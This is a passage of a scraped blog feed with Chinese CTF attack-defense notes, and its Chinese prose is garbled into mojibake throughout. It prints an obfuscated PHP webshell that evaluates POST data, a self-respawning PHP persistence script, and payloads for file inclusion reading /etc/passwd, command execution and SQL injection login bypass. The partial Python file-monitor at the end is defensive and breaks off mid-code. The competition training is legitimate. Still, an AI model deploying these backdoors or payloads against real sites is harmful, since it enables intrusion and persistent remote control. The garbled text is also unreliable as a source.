class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; </span><br></pre></td></tr></table></figure><p>åœ¨èœåˆ€é‡Œå†™<a href="http://xx.xx.xx.xx/test.php">http://xx.xx.xx.xx/test.php</a></p><p>è¿æ¥å¯†ç ï¼š<code>1</code></p><h2 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a>about.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5Mzg0OTgyLzA?x-oss-process=image/format,png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MTk0MzQ5MDYvMA?x-oss-process=image/format,png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‰“å¼€äº† <code>allow_url_include</code> å¹¶ä¸”ä»£ç ä¸­æœ‰æ˜æ˜¾çš„<code>æ–‡ä»¶åŒ…å«æ¼æ´</code></p><p>payloadä¸º<code>?file=/etc/passwd</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5NjgwOTc3LzA?x-oss-process=image/format,png"></p><p>å…·ä½“çš„æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥æŸ¥çœ‹<a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ">è¿™ç¯‡æ–‡ç« </a></p><h2 id="services-php"><a href="#services-php" class="headerlink" title="services.php"></a>services.php</h2><p>è¿™é‡Œæˆ‘ä»¬ç‚¹å‡»ç¬¬ä¸‰ä¸ªé€‰é¡¹<code>æœåŠ¡</code>,ç‚¹å‡»ä»¥åé¡µé¢æ­£å¸¸ è¿™é‡Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹å®ƒçš„æºç </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MTk5Mzg4MzIvMA?x-oss-process=image/format,png"></p><p>å‘ç°æœ‰å¼‚å¸¸,è¿™é‡Œæ˜¯ä¸€ä¸ªç®€å•çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>payload:?shell&#x3D;ls</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzMTUzODkvMA?x-oss-process=image/format,png"></p><h2 id="contact-php"><a href="#contact-php" class="headerlink" title="contact.php"></a>contact.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzNjM3NDQvMA?x-oss-process=image/format,png"></p><p>æŸ¥çœ‹æºç :</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTIwNDM2MzI1LzA?x-oss-process=image/format,png"></p><p>å¯ä»¥å‘ç°è¿™é‡Œä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´,ä¸è¿‡ç›¸æ¯”ä¸Šé¢é‚£ä¸ªæœ‰äº›å¤æ‚</p><p>payload:?path&#x3D;&#x2F;etc&#x2F;passwd</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzk2NDgwMzM2XzE1NzA1MjA1NDg0NjQvMA?x-oss-process=image/format,png"></p><p>çˆ†å‡ºpasswdæ–‡ä»¶</p><h2 id="footer-php"><a href="#footer-php" class="headerlink" title="footer.php"></a>footer.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MjA1ODIyNjUvMA?x-oss-process=image/format,png"></p><p>è¿”å›ä¸»é¡µ å‘ç°é¡µé¢åº•ç«¯æœ‰å¼‚å¸¸</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjA2NDY0OTQvMA?x-oss-process=image/format,png"></p><p>è¿™é‡Œæœ‰ç®€å•çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>æ³¨é‡Šå³å¯</p><h2 id="adminé¡µé¢"><a href="#adminé¡µé¢" class="headerlink" title="adminé¡µé¢"></a>adminé¡µé¢</h2><p>åœ¨ç™»é™†ç•Œé¢</p><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NjE0MDE3LzA?x-oss-process=image/format,png"></p><p>ç®€å•çš„sqlæ³¨å…¥</p><p>payload:<code>admin &#39; #</code></p><h2 id="header-php"><a href="#header-php" class="headerlink" title="header.php"></a>header.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NzU1ODAyLzA?x-oss-process=image/format,png"></p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªphpå‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>payload: <code>?p=cat /flag.txt</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTIxODk5OTkwNl8xNTcwNTM2OTk2MjU4LzA?x-oss-process=image/format,png"></p><p>å¥½äº†,ä»£ç å°±å·®ä¸å¤šå°±å®¡è®¡åˆ°è¿™é‡Œäº†,ä¸€äº›ç®€å•çš„åé—¨æ¼æ´ç­‰ç”¨Dç›¾æˆ–å®¡è®¡å·¥å…·å¯ä»¥æ‰¾å‡ºæ¥,è¦æƒ³æé«˜è‡ªå·±çš„è¯å°½é‡èŠ±ç‚¹æ—¶é—´,è‡ªä¸»å®¡è®¡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡&quot;&gt;&lt;a href=&quot;#CTF-AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡&quot; class=&quot;headerlink&quot; title=&quot;CTF AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡&quot;&gt;&lt;/a&gt;CTF AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="æ”»é˜²" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°</title>
    <link href="https://lhhxs.github.io/2022/09/07/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://lhhxs.github.io/2022/09/07/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-09-07T00:32:08.000Z</published>
    <updated>2022-09-09T14:24:18.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°"><a href="#ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°" class="headerlink" title="ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°"></a>ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°</h1><p>CTFçº¿ä¸‹æ”»é˜²èµ›ä¸»è¦ä»¥æ”»é˜²æ¨¡å¼ï¼ˆAttack &amp; Defenseï¼‰æ¥å‘ˆç°ã€‚ä¸€èˆ¬åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œä¸€æ”¯å‚èµ›é˜Ÿä¼æœ‰ä¸‰åé˜Ÿå‘˜ï¼Œæ‰€æœ‰çš„å‚èµ›é˜Ÿä¼éƒ½ä¼šæœ‰åŒæ ·çš„åˆå§‹ç¯å¢ƒï¼ŒåŒ…å«è‹¥å¹²å°æœåŠ¡å™¨ã€‚å‚èµ›é˜Ÿä¼æŒ–æ˜æ¼æ´ï¼Œé€šè¿‡æ”»å‡»å¯¹æ‰‹çš„æœåŠ¡å™¨è·å–Flagæ¥å¾—åˆ†ï¼Œä»¥ä¿®è¡¥è‡ªèº«æœåŠ¡å™¨çš„æ¼æ´é˜²æ­¢æ‰£åˆ†ã€‚</p><p>åœ¨è¿™ç§èµ›åˆ¶ä¸­ï¼Œä¸ä»…ä»…æ˜¯æ¯”å‚èµ›é˜Ÿå‘˜çš„æ™ºåŠ›å’ŒæŠ€æœ¯ï¼ŒåŒæ—¶ä¹Ÿæ¯”å›¢é˜Ÿä¹‹é—´çš„åˆ†å·¥é…åˆä¸åˆä½œã€‚</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvd3AtY29udGVudC91cGxvYWRzLzIwMTkvMDUvMDUxZGY3YWVmNTE3Zjc0OTZhMDNhODQxYjIwOTUxMzQucG5n?x-oss-process=image/format,png" alt="image"><br><strong>å…·ä½“æ­¥éª¤å¯ä»¥çœ‹æˆ‘çš„<a href="https://blog.csdn.net/qq_43442524/article/details/102652029">è¿™ç¯‡æ–‡ç« </a></strong></p><h2 id="é¢˜ç›®ç±»å‹"><a href="#é¢˜ç›®ç±»å‹" class="headerlink" title="é¢˜ç›®ç±»å‹"></a>é¢˜ç›®ç±»å‹</h2><ol><li>è¯­è¨€å¸¸è§æ¼æ´é¢˜ç›®</li></ol><p>PHPè¯­è¨€å±…å¤š</p><p>Python æ¨¡æ¿æ³¨å…¥(SSTI)ï¼šç›´æ¥åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤è·å¾—Flagã€ç»•è¿‡å…³é”®å­—é™åˆ¶ã€‚</p><p>Nodejs ä»»æ„æ–‡ä»¶è¯»å–ï¼šç›´æ¥è¯»å–Flagã€‚</p><p>PHP å„ç±»æ¼æ´ï¼šæ–‡ä»¶åŒ…å«ã€ååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ ã€æ³¨å…¥ã€ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œ</p><ol start="2"><li><p>åé—¨æ¼æ´</p></li><li><p>å…¬å¼€CMSæ¼æ´</p></li></ol><p>DZ SSRFæ¼æ´ã€å°ä¼—CMS 0dayã€å‡ºé¢˜äººè‡ªå·±æ”¹&#x2F;å†™çš„CMSã€‚</p><ol start="4"><li>æ–‡ä»¶ä¸Šä¼ æ¼æ´</li></ol><p>filelocation</p><ol start="5"><li>æ–‡ä»¶åŒ…å«æ¼æ´</li></ol><h2 id="åˆ†å·¥"><a href="#åˆ†å·¥" class="headerlink" title="åˆ†å·¥"></a>åˆ†å·¥</h2><p>åœ¨çº¿ä¸‹æ”»é˜²èµ›ä¸­ä¸€èˆ¬éœ€è¦ä¸¤åé˜Ÿå‘˜ä½œä¸ºæ”»å‡»è€…æ¥è¿›è¡Œæ¼æ´æŒ–æ˜ã€æƒé™ç»´æŒã€æ¢æŸ¥ç½‘ç»œã€æ¼æ´åˆ©ç”¨ã€è‡ªåŠ¨åŒ–æ”»å‡»ã€è‡ªåŠ¨åŒ–æäº¤ç­‰ã€‚è¿™ä¸¤åé˜Ÿå‘˜ä¸­è¦æœ‰ä¸€ä¸ªä»£ç ç¼–å†™èƒ½åŠ›æ¯”è¾ƒå¼ºçš„äººï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯åœ¨çŸ­æ—¶é—´å†…æ„é€ å‡ºèƒ½æ‰¹é‡æäº¤ã€è‡ªåŠ¨åŒ–æ”»å‡»çš„è„šæœ¬ç¨‹åºï¼Œé¿å…æµªè´¹äººåŠ›åœ¨æäº¤Flagä¸Šã€‚å¦ä¸€åé˜Ÿå‘˜å……å½“é˜²æŠ¤è€…çš„è§’è‰²è¿›è¡Œæ¼æ´ä¿®å¤ã€åé—¨æ’æŸ¥ã€æ–‡ä»¶ç›‘æ§ã€å¼±å£ä»¤æ’æŸ¥ç­‰ã€‚</p><h2 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h2><p>é˜²æŠ¤ä¸€èˆ¬æƒ…å†µä¸‹åˆ†ä¸ºæ¼æ´ä¿®å¤ã€æ–‡ä»¶å¤‡ä»½ã€åé—¨æ’æŸ¥ã€æ–‡ä»¶ç›‘æ§ã€å¼±å£ä»¤æ’æŸ¥ç­‰ã€‚</p><p>æ¼æ´ä¿®å¤å³åœ¨æ”»å‡»è€…è§’è‰²æ‰¾åˆ°äº†å¯ä»¥æ”»å‡»çš„ç‚¹ä¹‹åï¼Œåœ¨ç›¸åº”çš„ä»£ç å¤„è¿›è¡Œè¿‡æ»¤ã€ä¿®å¤ã€‚</p><p>æ–‡ä»¶å¤‡ä»½å³åœ¨å¼€å§‹è¿›è¡Œæ¯”èµ›çš„æ—¶å€™ä¸€å®šè¦å¯¹åŸå§‹æ•°æ®è¿›è¡Œå¤‡ä»½ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æœåŠ¡å™¨ç›¸å…³Webæ–‡ä»¶è¢«åˆ é™¤å¯¼è‡´æœåŠ¡Downæ‰ä¹‹åå¯ä»¥è‡ªè¡Œæ¢å¤ï¼ˆä¸€èˆ¬åœ¨çº¿ä¸‹æ¯”èµ›æœåŠ¡Downæ‰ä¼šæŒç»­æ‰£åˆ†ï¼Œè€Œé‡å¯ä¸€æ¬¡æœåŠ¡ä¼šæ‰£æ‰å¤§é‡åˆ†æ•°ï¼‰ã€‚</p><p>åé—¨æ’æŸ¥åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼šç¬¬ä¸€ç§ä¸ºä¸»åŠæ–¹ä¸ºäº†ç…§é¡¾æ°´å¹³æ¯”è¾ƒä½çš„é€‰æ‰‹è€Œç•™ä¸‹çš„éšè—åé—¨ï¼Œç¬¬äºŒç§ä¸ºå…¶ä»–å‚èµ›é˜Ÿä¼é€šè¿‡æ¼æ´å–å¾—æœåŠ¡å™¨ä¸€å®šæƒé™åç•™ä¸‹æ¥çš„åé—¨ã€‚é’ˆå¯¹ç¬¬ä¸€ç§æƒ…å†µå¯ä»¥å¼€å§‹æ¯”èµ›æ—¶æŠŠå¤‡ä»½æ–‡ä»¶åœ¨åé—¨æ’æŸ¥å·¥å…·é‡Œï¼ˆå¦‚Dç›¾ã€æ²³é©¬ï¼‰è¿›è¡Œä¸€æ¬¡WebShellå®¡æŸ¥ï¼Œæ‰¾åˆ°ä¸»åŠæ–¹ç•™ä¸‹çš„åé—¨ï¼Œåˆ é™¤å³å¯</p><p>ä½†æ˜¯ä¹Ÿæœ‰å¯èƒ½ä¸»åŠæ–¹ç•™ä¸‹äº†ä¸€ä¸ªå…æ€é©¬ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæœ‰å¤–ç½‘å¯ä»¥æŠŠæºä»£ç ä¸‹è½½ä¸‹æ¥ï¼ŒæŠŠå®˜æ–¹æºä»£ç å’Œæ¯”èµ›æºä»£ç è¿›è¡Œä¸€æ¬¡diffï¼Œè¿™ç§åŠæ³•åŸºæœ¬ä¸Šå¯ä»¥æ‰¾å‡ºæ‰€æœ‰ä¸»åŠæ–¹ç•™ä¸‹çš„WebShellã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼å¸®åŠ©æ”»å‡»è€…è¿›è¡Œæ¼æ´æŒ–æ˜ï¼Œå› ä¸ºå¦‚æœä¸æ˜¯å·²çŸ¥å…¬å¼€çš„æ¼æ´ï¼Œä¸»åŠæ–¹éƒ½ä¼šåœ¨æºä»£ç é‡Œè¿›è¡Œæ›´æ”¹ï¼Œè¾¾åˆ°å¯ä»¥GetShellçš„ç›®çš„ã€‚é’ˆå¯¹ç¬¬äºŒç§æƒ…å†µè¦çœ‹æ”»å‡»è€…ç•™ä¸‹äº†ä»€ä¹ˆç±»å‹çš„åé—¨ï¼Œå¦‚æœæ˜¯æ™®é€šçš„WebShellä¸€å¥è¯æˆ–è€…å˜ç§çš„ä¸€å¥è¯æœ¨é©¬ï¼Œé‚£ä¹ˆç›´æ¥åˆ é™¤å³å¯ã€‚å¦‚æœæ˜¯ä¸æ­»é©¬+å†…å­˜é©¬å°±ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºåœ¨çº¿ä¸‹æ”»é˜²èµ›ä¸­ä¸€èˆ¬ä¸æ˜¯rootæƒé™ï¼Œæ‰€ä»¥æ˜¯æ²¡æœ‰æƒé™æ€æ­»è¿›ç¨‹çš„ã€‚ä¸€èˆ¬çš„ä¸æ­»é©¬éƒ½æ˜¯é€šè¿‡å¾ªç¯åˆ›å»ºWebShellæ–‡ä»¶ï¼Œå¦‚æœä¸æ€æ­»è¿›ç¨‹çš„è¯ä¼šä¸€ç›´åˆ›å»ºä¸‹å»ï¼Œä½†æ˜¯ä¹Ÿä¼šæœ‰å»¶æ—¶æ€§ï¼Œå¯ä»¥é€šè¿‡è¿™ç§å»¶æ—¶æ€§å†™ä¸€ä¸ªæš´åŠ›å¾ªç¯åˆ é™¤çš„è„šæœ¬æ¥è¾¾åˆ°åˆ é™¤çš„ç›®çš„</p><p>å¸¸è§ä¸æ­»é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">    <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.config.php&quot;</span>, <span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ç›‘æ§å³æ˜¯è¦é’ˆå¯¹æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºçš„ä»»ä½•æ–‡ä»¶æœ‰ä¸€ä¸ªå‘Šè­¦æˆ–è€…é˜»æ–­çš„æ“ä½œï¼Œè¦ä¿æŒæœåŠ¡å™¨çš„æ–‡ä»¶ä¸è¢«åˆ é™¤ï¼Œä¸å…è®¸ä¸Šä¼ æˆ–è€…åˆ›å»ºæ–‡ä»¶ã€‚ç½‘ä¸Šæœ‰ç›¸åº”çš„æ–‡ä»¶ç›‘æ§çš„è„šæœ¬ï¼Œå¯ä»¥å‚è€ƒå­¦ä¹ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># æ–‡ä»¶MD5å­—å…¸</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç‰¹æ®Šæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²</span></span><br><span class="line">Special_path_str = <span class="string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span></span><br><span class="line">bakstring = <span class="string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span></span><br><span class="line">logstring = <span class="string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">webshellstring = <span class="string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">difffile = <span class="string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&#x27;drops_log&#x27;</span>  <span class="comment"># å…æ­»é‡‘ç‰Œ</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶è·¯å¾„å­—å…¸</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isListLike</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–Unicodeç¼–ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUnicode</span>(<span class="params">value, encoding=<span class="literal">None</span>, noneToNull=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = <span class="built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> 